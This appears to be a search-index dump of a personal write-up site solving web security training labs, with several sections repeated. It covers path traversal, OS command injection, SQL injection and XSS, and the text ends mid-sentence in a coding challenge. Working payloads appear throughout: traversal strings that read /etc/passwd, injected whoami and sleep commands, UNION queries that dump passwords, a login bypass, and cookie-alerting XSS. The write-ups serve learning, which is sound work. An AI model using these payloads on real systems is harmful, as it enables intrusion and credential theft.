elmer:x:12099:12099::/home/elmer:/bin/bash academy:x:10000:10000::/home/academy:/bin/bash dnsmasq:x:101:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin messagebus:x:102:101::/nonexistent:/usr/sbin/nologin","title":" File path traversal, simple case"},{"location":"ctf/ps-dirtrav.html#file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass","text":"Question This lab contains a file path traversal vulnerability in the display of product images. The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory. To solve the lab, retrieve the contents of the /etc/passwd file. This one was pretty easy. Given a request like the following: GET /image?filename=48.jpg HTTP/1.1 I confirmed that it didn't work the \"easy way\" by testing this: GET /image?filename=../../../etc/passwd HTTP/1.1 And received an error indicating the requested file did not exist. So, following the instructions, I adjusted the request as follows: GET /image?filename=/etc/passwd HTTP/1.1 And was rewarded with the contents of the /etc/passwd file.","title":" File path traversal, traversal sequences blocked with absolute path bypass"},{"location":"ctf/ps-dirtrav.html#file-path-traversal-traversal-sequences-stripped-non-recursively","text":"Question This lab contains a file path traversal vulnerability in the display of product images. The application strips path traversal sequences from the user-supplied filename before using it. To solve the lab, retrieve the contents of the /etc/passwd file. The key to solving this lab is that the server-side code appears to be looking for instances of ../ and stripping them, but non-recursively . This means, that they might have a line that looks like the following bit of python: safe_path = requested_path . replace ( \"../\" , \"\" ) If you provide a request that looks like this: /image?filename=....//....//....//etc/passwd , the value of safe_path still has a traversal problem, which means we will still get the file we are looking for which, is in fact, the case here.","title":" File path traversal, traversal sequences stripped non-recursively"},{"location":"ctf/ps-dirtrav.html#file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode","text":"Question This lab contains a file path traversal vulnerability in the display of product images. The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it. To solve the lab, retrieve the contents of the /etc/passwd file. On this one, I tried URL-encoding the traversal attack as follows: GET /image?filename=%2E%2E%2f%2E%2E%2f%2E%2E%2fetc%2fpasswd HTTP/1.1 You see that each . becomes %2e and each / becomes %2f . But this didn't work. I then tried double URL encoding the path as shown below, which did work. GET /image?filename=%252E%252E%252f%252E%252E%252f%252E%252E%252fetc%252fpasswd HTTP/1.1 The problem or bug in this application is that they called a \"safe\" function (URL-decode) twice... once prior to checking for path traversal issues (a good thing) but a second time after checking for path traversal issues. This could almost be considered a TOCTOU type bug.","title":" File path traversal, traversal sequences stripped with superfluous URL-decode"},{"location":"ctf/ps-dirtrav.html#file-path-traversal-validation-of-start-of-path","text":"Question This lab contains a file path traversal vulnerability in the display of product images. The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder. To solve the lab, retrieve the contents of the /etc/passwd file. Within the HTTP request log, I found a request that looks like this: GET /image?filename=/var/www/images/47.jpg HTTP/1.1 I modified it as follows: GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1 After submission, I was presented the /etc/passwd file.","title":" File path traversal, validation of start of path"},{"location":"ctf/ps-dirtrav.html#file-path-traversal-validation-of-file-extension-with-null-byte-bypass","text":"Question This lab contains a file path traversal vulnerability in the display of product images. The application validates that the supplied filename ends with the expected file extension. To solve the lab, retrieve the contents of the /etc/passwd file. If you take the time to read the documentation on this type of issue, the solution becomes quite straight forward. The following GET request does the trick: GET /image?filename=../../../etc/passwd%00.jpg HTTP/1.1","title":" File path traversal, validation of file extension with null byte bypass"},{"location":"ctf/ps-hostheader.html","text":"HTTP Host Header Attacks \u00b6 Basic Password Reset Poisoning \u00b6 We are told that carlos will click any link in any email he receives. The goal is to log in to Carlos's account. We are given a valid set of credentials. Given the title of the challenge, I'm assuming that in the POST request to reset my password, there will be a header that can be manipulated or maybe in the password reset link.","title":"HTTP Host Headers"},{"location":"ctf/ps-hostheader.html#http-host-header-attacks","text":"","title":"HTTP Host Header Attacks"},{"location":"ctf/ps-hostheader.html#basic-password-reset-poisoning","text":"We are told that carlos will click any link in any email he receives. The goal is to log in to Carlos's account. We are given a valid set of credentials. Given the title of the challenge, I'm assuming that in the POST request to reset my password, there will be a header that can be manipulated or maybe in the password reset link.","title":"Basic Password Reset Poisoning"},{"location":"ctf/ps-oscmdi.html","text":"OS Command Injection \u00b6 OS command injection, simple case \u00b6 Question This lab contains an OS command injection vulnerability in the product stock checker. The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response. To solve the lab, execute the whoami command to determine the name of the current user. This application issues a POST reequest to the /product/stock endpoint with the following expected payload: productId=1&storeId=1 . With valid values, you receive something like 62 as the payload of the response. The instructions and page make it appear as though you simply change the values to echo test or something like productId=& whoami &storeId=1 but it wasn't quite that simle for me. Instead, I had to play around a bit with URL encoding, and ended up with the following: productId=%26%20echo%20george%20%26&storeId=whoami Which gave me a return like this: george peter-tVfyfI I'm certain there are other variations that will produce the right results. Blind OS command injection with time delays \u00b6 Question This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay. I modified the request as follows ( & sleep 10 & ): csrf=VWek8OQ95kgxwPflHuYs4ECgWNDFwhYx&name=%26%20sleep%2010%20%26&email=%26%20sleep%2010%20%26&subject=%26%20sleep%2010%20%26&message=%26%20sleep%2010%20%26 This worked, but it bugs be a little that I had to replace all of the params with the injected command. I did some additional testing, and it looks like (for some unknown reason) both the email and subject params need to have the sleep command, otherwise it simply returns immediately. Blind OS command injection with output redirection \u00b6 Question This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at: /var/www/images/ The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file. To solve the lab, execute the whoami command and retrieve the output. To solve this challenge, I crafted a string: & whoami > /var/www/images/bubba & and then fully URL-encoded it as %26%20whoami%20%3E%20%2fvar%2fwww%2fimages%2fbubba%20%26 . Using the information from the prior challenge, I substituted my command payload in both the email and subject fields as such: csrf=S8sIaTUHU6dSoL5PmQ8UhXVy4ud17qLa&name=george&email=%26%20whoami%20%3E%20%2fvar%2fwww%2fimages%2fbubba%20%26&subject=%26%20whoami%20%3E%20%2fvar%2fwww%2fimages%2fbubba%20%26&message=test And submitted it. I then found an image-returning request and modified the path to my newly-created file: GET /image?filename=bubba HTTP/1.1 and I was presented with the currently running user: peter-rYqzDj","title":"OS Command Injection"},{"location":"ctf/ps-oscmdi.html#os-command-injection","text":"","title":"OS Command Injection"},{"location":"ctf/ps-oscmdi.html#os-command-injection-simple-case","text":"Question This lab contains an OS command injection vulnerability in the product stock checker. The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response. To solve the lab, execute the whoami command to determine the name of the current user. This application issues a POST reequest to the /product/stock endpoint with the following expected payload: productId=1&storeId=1 . With valid values, you receive something like 62 as the payload of the response. The instructions and page make it appear as though you simply change the values to echo test or something like productId=& whoami &storeId=1 but it wasn't quite that simle for me. Instead, I had to play around a bit with URL encoding, and ended up with the following: productId=%26%20echo%20george%20%26&storeId=whoami Which gave me a return like this: george peter-tVfyfI I'm certain there are other variations that will produce the right results.","title":" OS command injection, simple case"},{"location":"ctf/ps-oscmdi.html#blind-os-command-injection-with-time-delays","text":"Question This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay. I modified the request as follows ( & sleep 10 & ): csrf=VWek8OQ95kgxwPflHuYs4ECgWNDFwhYx&name=%26%20sleep%2010%20%26&email=%26%20sleep%2010%20%26&subject=%26%20sleep%2010%20%26&message=%26%20sleep%2010%20%26 This worked, but it bugs be a little that I had to replace all of the params with the injected command. I did some additional testing, and it looks like (for some unknown reason) both the email and subject params need to have the sleep command, otherwise it simply returns immediately.","title":" Blind OS command injection with time delays"},{"location":"ctf/ps-oscmdi.html#blind-os-command-injection-with-output-redirection","text":"Question This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at: /var/www/images/ The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file. To solve the lab, execute the whoami command and retrieve the output. To solve this challenge, I crafted a string: & whoami > /var/www/images/bubba & and then fully URL-encoded it as %26%20whoami%20%3E%20%2fvar%2fwww%2fimages%2fbubba%20%26 . Using the information from the prior challenge, I substituted my command payload in both the email and subject fields as such: csrf=S8sIaTUHU6dSoL5PmQ8UhXVy4ud17qLa&name=george&email=%26%20whoami%20%3E%20%2fvar%2fwww%2fimages%2fbubba%20%26&subject=%26%20whoami%20%3E%20%2fvar%2fwww%2fimages%2fbubba%20%26&message=test And submitted it. I then found an image-returning request and modified the path to my newly-created file: GET /image?filename=bubba HTTP/1.1 and I was presented with the currently running user: peter-rYqzDj","title":" Blind OS command injection with output redirection"},{"location":"ctf/ps-sqi.html","text":"SQL Injection \u00b6 UNION attack, determining the number of columns returned by the query \u00b6 Question This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack. To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values. What we know: vulnerability in product category filter should be able to use UNION attack to see data from other tables first step is to see number of columns being returned by the query https://acd21fe61eb0074fc0b23b47009700b8.web-security-academy.net/filter?category=Pets The first approach to determining how many columns is to do the ORDER BY trick with increasing numbers until you get an error. We do that and see that it errors on 4 , indicating that three columns are being returned: /filter?category=Pets' ORDER BY 1 -- /filter?category=Pets' ORDER BY 2 -- /filter?category=Pets' ORDER BY 3 -- /filter?category=Pets' ORDER BY 4 -- (error) The second approach (and the one required for solving this lab) is to use the UNION SELECT NULL trick with the selected number of NULL columns. Based on the information gained in the first approach, we craft the following query/filter and solve the challenge: /filter?category=Pets' UNION SELECT NULL, NULL, NULL -- UNION attack, finding a column containing text \u00b6 Question This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data. The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. Given: SQL injection vuln in the product category filter Should be able to do a union attack to pull data from other tables builds on previous lab need to identify a column that is compatible with string data Goal: perform the SQL Injection UNION attack, return additional row containing value provided: S3HPlT . We walk through the three fields looking for a match: /filter?category=Pets' UNION SELECT 'S3HPlT',NULL,NULL-- (internal server error) /filter?category=Pets' UNION SELECT NULL,'S3HPlT',NULL-- (success!) /filter?category=Pets' UNION SELECT NULL,'S3HPlT',NULL-- (internal server error) And we can see that the second attempt solved the challenge - we now know that the query is returning 3 columns and the second is compatible with string data. SQL injection UNION attack, retrieving data from other tables \u00b6 Question This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs. The database contains a different table called users, with columns called username and password. To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. Building on prior solutions, we wnt to retrieve data from other tables. We are told that there is another table called users that has a column named username and another called password . Note that this is easier than the above as we don't have to shove things into one column (yet). /filter?category=Pets' UNION select username, password from users -- yields us information like the following: The Lazy Dog The Lazy Dog is brought to you by the same people who invented the... carlos 934rdmfpigx806kxma0m administrator 734gs039pp7hvz53glwk wiener 6yfdkdcuexrs36a2nd2a We can then take this information and log in as the administrator account. SQL injection UNION attack, retrieving multiple values in a single column \u00b6 Question This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables. The database contains a different table called users, with columns called username and password. To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. This is very much like the prior scenario, but uses the structure from the prior challenges wherein you have three columns, and only the second is compatible with strings. Therefore, we have to shove both the username and password into the same field. This can be done with a query that looks like the following: // determine how many columns exist filter?category=Pets' UNION SELECT NULL,NULL -- // confirm which columns support text: filter?category=Pets' UNION SELECT NULL,'a' -- (column 2) // grab the username/password and stuff them into the 2nd column /filter?category=Pets' UNION SELECT NULL,username || '~' || password from users -- This yeilds a result like the following: More Than Just Birdsong Pest Control Umbrella Babbage Web Spray administrator~o7188srj54a849wwm2cq Giant Grasshopper wiener~8hxtfx4depv2otj53nb9 carlos~z54oyd1moidzjxuz9oxm And we can then log in as the administrator, solving the challenge SQL injection attack, querying the database type and version on Oracle \u00b6 Question This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query. To solve the lab, display the database version string. Tip I failed quite a bit on this until I clicked the 'hint' and learned that every select on ORACLE needs a from stmt. // determine how many columns are being returned (2) /filter?category=Gifts' ORDER BY 2 -- // confirm that both columns are compatible with strings (using built-in table named `dual`) /filter?category=Gifts' UNION SELECT 'a','a' from dual -- // now let's start doing something /filter?category=Gifts' UNION SELECT version FROM v$version -- // query the banner /filter?category=Gifts' UNION SELECT BANNER,'a' from v$version -- And that produces the solution: CORE 11.2.0.2.0 Production a NLSRTL Version 11.2.0.2.0 - Production a Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production a PL/SQL Release 11.2.0.2.0 - Production a TNS for Linux: Version 11.2.0.2.0 - Production a Vulnerability in WHERE clause allowing retrieval of hidden data \u00b6 Question This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following: SELECT * FROM products WHERE category = 'Gifts' AND released = 1 To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased. This is a simple challenge to introduce you to the idea of SQL injection. Given a site such as https://acd01f0d1f5c2eb5c0cc51a2007a0016.web-security-academy.net/ you can view differenct product categories which are controlled by the URL (e.g. /filter?category=Pets ). A simple SQL injection attack added to the end ( /filter?category=' OR 1=1 -- ) solves the challenge by telling the SQL server to return all products with no category set or where 1=1 (which always evaluates to True). Adding the -- at the end comments out any remainder of the SQL statment in the application code. Vulnerability allowing login bypass \u00b6 Question This lab contains an SQL injection vulnerability in the login function. To solve the lab, perform an SQL injection attack that logs in to the application as the administrator user. This is another simple case wherein you are encouraged to log in at a standard username/password form ( https://ac031f731e5b8017c0984a7400ba0058.web-security-academy.net/login ). Much like the prior example, however, you can manipulate the query directly by providing a username of administrator'-- and any value for the password field. This terminates the query that is presumeably something like SELECT * FROM users WHERE username = 'administrator' AND password = 'myPassword' . It results in the following query: SELECT * FROM users WHERE username = 'administrator'--' AND password = 'no matter' SQL injection attack, querying the database type and version on MySQL and Microsoft \u00b6 Similar to the prior SQL injection attack, listing the database contents on Oracle \u00b6","title":"SQL Injection"},{"location":"ctf/ps-sqi.html#sql-injection","text":"","title":"SQL Injection"},{"location":"ctf/ps-sqi.html#union-attack-determining-the-number-of-columns-returned-by-the-query","text":"Question This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack. To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values. What we know: vulnerability in product category filter should be able to use UNION attack to see data from other tables first step is to see number of columns being returned by the query https://acd21fe61eb0074fc0b23b47009700b8.web-security-academy.net/filter?category=Pets The first approach to determining how many columns is to do the ORDER BY trick with increasing numbers until you get an error. We do that and see that it errors on 4 , indicating that three columns are being returned: /filter?category=Pets' ORDER BY 1 -- /filter?category=Pets' ORDER BY 2 -- /filter?category=Pets' ORDER BY 3 -- /filter?category=Pets' ORDER BY 4 -- (error) The second approach (and the one required for solving this lab) is to use the UNION SELECT NULL trick with the selected number of NULL columns. Based on the information gained in the first approach, we craft the following query/filter and solve the challenge: /filter?category=Pets' UNION SELECT NULL, NULL, NULL --","title":" UNION attack, determining the number of columns returned by the query"},{"location":"ctf/ps-sqi.html#union-attack-finding-a-column-containing-text","text":"Question This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data. The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. Given: SQL injection vuln in the product category filter Should be able to do a union attack to pull data from other tables builds on previous lab need to identify a column that is compatible with string data Goal: perform the SQL Injection UNION attack, return additional row containing value provided: S3HPlT . We walk through the three fields looking for a match: /filter?category=Pets' UNION SELECT 'S3HPlT',NULL,NULL-- (internal server error) /filter?category=Pets' UNION SELECT NULL,'S3HPlT',NULL-- (success!) /filter?category=Pets' UNION SELECT NULL,'S3HPlT',NULL-- (internal server error) And we can see that the second attempt solved the challenge - we now know that the query is returning 3 columns and the second is compatible with string data.","title":" UNION attack, finding a column containing text"},{"location":"ctf/ps-sqi.html#sql-injection-union-attack-retrieving-data-from-other-tables","text":"Question This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs. The database contains a different table called users, with columns called username and password. To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. Building on prior solutions, we wnt to retrieve data from other tables. We are told that there is another table called users that has a column named username and another called password . Note that this is easier than the above as we don't have to shove things into one column (yet). /filter?category=Pets' UNION select username, password from users -- yields us information like the following: The Lazy Dog The Lazy Dog is brought to you by the same people who invented the... carlos 934rdmfpigx806kxma0m administrator 734gs039pp7hvz53glwk wiener 6yfdkdcuexrs36a2nd2a We can then take this information and log in as the administrator account.","title":" SQL injection UNION attack, retrieving data from other tables"},{"location":"ctf/ps-sqi.html#sql-injection-union-attack-retrieving-multiple-values-in-a-single-column","text":"Question This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables. The database contains a different table called users, with columns called username and password. To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. This is very much like the prior scenario, but uses the structure from the prior challenges wherein you have three columns, and only the second is compatible with strings. Therefore, we have to shove both the username and password into the same field. This can be done with a query that looks like the following: // determine how many columns exist filter?category=Pets' UNION SELECT NULL,NULL -- // confirm which columns support text: filter?category=Pets' UNION SELECT NULL,'a' -- (column 2) // grab the username/password and stuff them into the 2nd column /filter?category=Pets' UNION SELECT NULL,username || '~' || password from users -- This yeilds a result like the following: More Than Just Birdsong Pest Control Umbrella Babbage Web Spray administrator~o7188srj54a849wwm2cq Giant Grasshopper wiener~8hxtfx4depv2otj53nb9 carlos~z54oyd1moidzjxuz9oxm And we can then log in as the administrator, solving the challenge","title":" SQL injection UNION attack, retrieving multiple values in a single column"},{"location":"ctf/ps-sqi.html#sql-injection-attack-querying-the-database-type-and-version-on-oracle","text":"Question This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query. To solve the lab, display the database version string. Tip I failed quite a bit on this until I clicked the 'hint' and learned that every select on ORACLE needs a from stmt. // determine how many columns are being returned (2) /filter?category=Gifts' ORDER BY 2 -- // confirm that both columns are compatible with strings (using built-in table named `dual`) /filter?category=Gifts' UNION SELECT 'a','a' from dual -- // now let's start doing something /filter?category=Gifts' UNION SELECT version FROM v$version -- // query the banner /filter?category=Gifts' UNION SELECT BANNER,'a' from v$version -- And that produces the solution: CORE 11.2.0.2.0 Production a NLSRTL Version 11.2.0.2.0 - Production a Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production a PL/SQL Release 11.2.0.2.0 - Production a TNS for Linux: Version 11.2.0.2.0 - Production a","title":" SQL injection attack, querying the database type and version on Oracle"},{"location":"ctf/ps-sqi.html#vulnerability-in-where-clause-allowing-retrieval-of-hidden-data","text":"Question This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following: SELECT * FROM products WHERE category = 'Gifts' AND released = 1 To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased. This is a simple challenge to introduce you to the idea of SQL injection. Given a site such as https://acd01f0d1f5c2eb5c0cc51a2007a0016.web-security-academy.net/ you can view differenct product categories which are controlled by the URL (e.g. /filter?category=Pets ). A simple SQL injection attack added to the end ( /filter?category=' OR 1=1 -- ) solves the challenge by telling the SQL server to return all products with no category set or where 1=1 (which always evaluates to True). Adding the -- at the end comments out any remainder of the SQL statment in the application code.","title":" Vulnerability in WHERE clause allowing retrieval of hidden data"},{"location":"ctf/ps-sqi.html#vulnerability-allowing-login-bypass","text":"Question This lab contains an SQL injection vulnerability in the login function. To solve the lab, perform an SQL injection attack that logs in to the application as the administrator user. This is another simple case wherein you are encouraged to log in at a standard username/password form ( https://ac031f731e5b8017c0984a7400ba0058.web-security-academy.net/login ). Much like the prior example, however, you can manipulate the query directly by providing a username of administrator'-- and any value for the password field. This terminates the query that is presumeably something like SELECT * FROM users WHERE username = 'administrator' AND password = 'myPassword' . It results in the following query: SELECT * FROM users WHERE username = 'administrator'--' AND password = 'no matter'","title":" Vulnerability allowing login bypass"},{"location":"ctf/ps-sqi.html#sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft","text":"Similar to the prior","title":"SQL injection attack, querying the database type and version on MySQL and Microsoft"},{"location":"ctf/ps-sqi.html#sql-injection-attack-listing-the-database-contents-on-oracle","text":"","title":"SQL injection attack, listing the database contents on Oracle"},{"location":"ctf/ps-xss.html","text":"Cross-Site Scripting \u00b6 Reflected XSS into HTML conext with Nothing Encoded \u00b6 Question This lab contains a simple reflected cross-site scripting vulnerability in the search functionality. To solve the lab, perform a cross-site scripting attack that calls the alert function. Visiting the site, there is a search form. I searched for test and was redirected to t/?search=test . I then searched for test <script>alert();</script> and, not surprisingly, I receieved an alert and completed the lab. Stored XSS into HTML context with nothing encoded \u00b6 Question This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the blog post is viewed. Found an comment form on the website and submitted the following: This is awesome!<script>alert('you stink');</script> . Once I submitted and then visited the post again, the alert was triggered and the lab was solved. DOM XSS in document.write sink using source location.search \u00b6 Question This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search , which you can control using the website URL. I started out by attempting to search for test <script>alert();</script> which displayed the exact same contents out on the page (no alert box). I then reviewed the source code for the page and found this bit of Javascript: document . write ( '<img src=\"/resources/images/tracker.gif?searchTerms=' + query + '\">' ); With this knowledge, I re-structured my query to close out the end of the img tag and render my javascript. Submitting this: test'\"><script>alert();</script> allowed me to solve the challenge. DOM XSS in innerHTML sink using source location.search \u00b6 Question This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search . The Javascript on the page looks like the following: document . getElementById ( 'searchMessage' ). innerHTML = query ; Doing an ill-informed attempt results in DOM that looks like the following (and is unsuccessful): < h1 > < span > 0 search results for ' </ span > < span id = \"searchMessage\" > < script > alert ();</ script > </ span > < span > ' </ span > </ h1 > I went down a failed rathole here a bit before I read https://portswigger.net/web-security/cross-site-scripting/dom-based and noticed that the innerHTML sink doesn't accept script elements and, as such, you need to use other elements usch as img or iframe . I used the example directly from the page ( <img src=1 onerror=alert(document.domain)> ) and it worked successfully. DOM XSS in jQuery anchor href attribute sink using location.search source \u00b6 Question This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search . To solve this lab, make the \"back\" link alert document.cookie . I noticed the \"submit feedback\" link on the page, and if you click on it, you are directed to a feedback form that has a \"back\" link at the bottom of it (this is what we need to mess with). Additionally, the URL looks like this: /feedback?returnPath=/ . After a little experimentation, I simply changed the URL to /feedback?returnPath=javascript:alert(document.cookie); and hit enter. This caused the page to render, and looking at the DOM, we now see the following: < div class = \"is-linkback\" > < a id = \"backLink\" href = \"javascript:alert(document.cookie);\" > Back </ a > </ div > Of course, clicking the link completes the challenge. DOM XSS in jQuery selector sink using a hashchange event \u00b6 Question This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property. To solve the lab, deliver an exploit to the victim that calls the print() function in their browser. Ok, this one was a little weird, only because it took me a bit to a.) understand what they wanted me to do and b.) wrap my head around the who-sends-what-to-whom part of things. Once I figured out what the code on the vulnerable site was doing, I then headed over to the exploit server and, leaving the first few fields with their default values, set the body to: < iframe src = \"https://ac1d1fef1e4a1f89c02b0709003e00de.web-security-academy.net/#\" onload = \"this.src+='<img src=1 onerror=print()>'\" > Pressing the View Exploit button made it clear that it was working (couldn't get it to stop trying to print). Coming back and clicking the Deliver exploit to victim button confirmed that I had solved the lab.","title":"Cross-Site Scripting"},{"location":"ctf/ps-xss.html#cross-site-scripting","text":"","title":"Cross-Site Scripting"},{"location":"ctf/ps-xss.html#reflected-xss-into-html-conext-with-nothing-encoded","text":"Question This lab contains a simple reflected cross-site scripting vulnerability in the search functionality. To solve the lab, perform a cross-site scripting attack that calls the alert function. Visiting the site, there is a search form. I searched for test and was redirected to t/?search=test . I then searched for test <script>alert();</script> and, not surprisingly, I receieved an alert and completed the lab.","title":" Reflected XSS into HTML conext with Nothing Encoded"},{"location":"ctf/ps-xss.html#stored-xss-into-html-context-with-nothing-encoded","text":"Question This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the blog post is viewed. Found an comment form on the website and submitted the following: This is awesome!<script>alert('you stink');</script> . Once I submitted and then visited the post again, the alert was triggered and the lab was solved.","title":" Stored XSS into HTML context with nothing encoded"},{"location":"ctf/ps-xss.html#dom-xss-in-documentwrite-sink-using-source-locationsearch","text":"Question This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search , which you can control using the website URL. I started out by attempting to search for test <script>alert();</script> which displayed the exact same contents out on the page (no alert box). I then reviewed the source code for the page and found this bit of Javascript: document . write ( '<img src=\"/resources/images/tracker.gif?searchTerms=' + query + '\">' ); With this knowledge, I re-structured my query to close out the end of the img tag and render my javascript. Submitting this: test'\"><script>alert();</script> allowed me to solve the challenge.","title":" DOM XSS in document.write sink using source location.search"},{"location":"ctf/ps-xss.html#dom-xss-in-innerhtml-sink-using-source-locationsearch","text":"Question This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search . The Javascript on the page looks like the following: document . getElementById ( 'searchMessage' ). innerHTML = query ; Doing an ill-informed attempt results in DOM that looks like the following (and is unsuccessful): < h1 > < span > 0 search results for ' </ span > < span id = \"searchMessage\" > < script > alert ();</ script > </ span > < span > ' </ span > </ h1 > I went down a failed rathole here a bit before I read https://portswigger.net/web-security/cross-site-scripting/dom-based and noticed that the innerHTML sink doesn't accept script elements and, as such, you need to use other elements usch as img or iframe . I used the example directly from the page ( <img src=1 onerror=alert(document.domain)> ) and it worked successfully.","title":" DOM XSS in innerHTML sink using source location.search"},{"location":"ctf/ps-xss.html#dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source","text":"Question This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search . To solve this lab, make the \"back\" link alert document.cookie . I noticed the \"submit feedback\" link on the page, and if you click on it, you are directed to a feedback form that has a \"back\" link at the bottom of it (this is what we need to mess with). Additionally, the URL looks like this: /feedback?returnPath=/ . After a little experimentation, I simply changed the URL to /feedback?returnPath=javascript:alert(document.cookie); and hit enter. This caused the page to render, and looking at the DOM, we now see the following: < div class = \"is-linkback\" > < a id = \"backLink\" href = \"javascript:alert(document.cookie);\" > Back </ a > </ div > Of course, clicking the link completes the challenge.","title":" DOM XSS in jQuery anchor href attribute sink using location.search source"},{"location":"ctf/ps-xss.html#dom-xss-in-jquery-selector-sink-using-a-hashchange-event","text":"Question This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property. To solve the lab, deliver an exploit to the victim that calls the print() function in their browser. Ok, this one was a little weird, only because it took me a bit to a.) understand what they wanted me to do and b.) wrap my head around the who-sends-what-to-whom part of things. Once I figured out what the code on the vulnerable site was doing, I then headed over to the exploit server and, leaving the first few fields with their default values, set the body to: < iframe src = \"https://ac1d1fef1e4a1f89c02b0709003e00de.web-security-academy.net/#\" onload = \"this.src+='<img src=1 onerror=print()>'\" > Pressing the View Exploit button made it clear that it was working (couldn't get it to stop trying to print). Coming back and clicking the Deliver exploit to victim button confirmed that I had solved the lab.","title":" DOM XSS in jQuery selector sink using a hashchange event"},{"location":"ctf/rz-coding.html","text":"Coding Challenges \u00b6 Hash Me Please \u00b6 In this challenge, you are presented with a \"message\" on a web page that you need to encode using sha512 and post to a URL within 2 seconds . Obviously, the primary task (encoding using sha512 ) isn't hard, but doing it within 2 seconds is designed to require that you write some code/script the operation rather than trying to copy/paste it into some online tool, generate the hash, and then post. I spent some time writing up a little python script that I hope will serve me well over a handful of challenges. Essentially, it does the following: requests the challenge page ( https://ringzer0ctf.com/challenges/13 ) parses the results and extracts the message text encodes the text using sha512 issues a get request to https://ringzer0ctf.com/challenges/13/<generated_hash> parse the results of that get() and extracts the flag I then manually submit the flag and collect my points. Note I assumed I needed to do this all while 